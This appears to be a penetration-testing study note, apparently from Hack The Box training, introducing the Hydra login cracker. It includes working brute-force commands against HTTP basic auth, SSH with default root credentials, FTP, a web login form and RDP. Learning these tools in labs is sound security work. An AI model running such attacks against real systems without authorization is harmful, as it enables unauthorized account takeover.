...
date: '2025-03-03'
tags: ['Cybersecurity', 'Login Brute Forcing']
draft: false
summary: 'Hydra is a fast network login cracker that supports numerous attack protocols. it can brute force services such as web apps, ssh, ftp, and databases.'
---

# 🚀 Introduction

Why use hydra? It has:

- speed and efficiency through parallel connections to perform multiple login attempts simultaneously
- Flexibility to support many different protocols and services making it very adaptable
- Very easy to use with straightforward command-line interface

![Hydra](https://www.kali.org/tools/hydra/images/hydra-logo.svg) Edit 🖊️
...
```shell-session
EvaUnit09@htb[/htb]$ hydra [login_options] [password_options] [attack_options] [service_options]
```
...
Hydra services essentially define the specific protocols or services that Hydra can target. Below is a table of commonly used services:
...
Test the security of a website using basic HTTP authentication at `www.example.com`. You have a list of potential usernames stored in `usernames.txt` and corresponding passwords in `passwords.txt`. To launch a brute-force attack against this HTTP service, use the following Hydra command:

Hydra

```shell-session
EvaUnit09@htb[/htb]$ hydra -L usernames.txt -P passwords.txt www.example.com http-get
```
...
```shell-session
EvaUnit09@htb[/htb]$ hydra -l root -p toor -M targets.txt ssh
```
...
```shell-session
EvaUnit09@htb[/htb]$ hydra -L usernames.txt -P passwords.txt -s 2121 -V ftp.example.com ftp
```
...
```shell-session
EvaUnit09@htb[/htb]$ hydra -l admin -P passwords.txt www.example.com http-post-form "/login:user=^USER^&pass=^PASS^:S=302"
```
...
```shell-session
EvaUnit09@htb[/htb]$ hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp
```
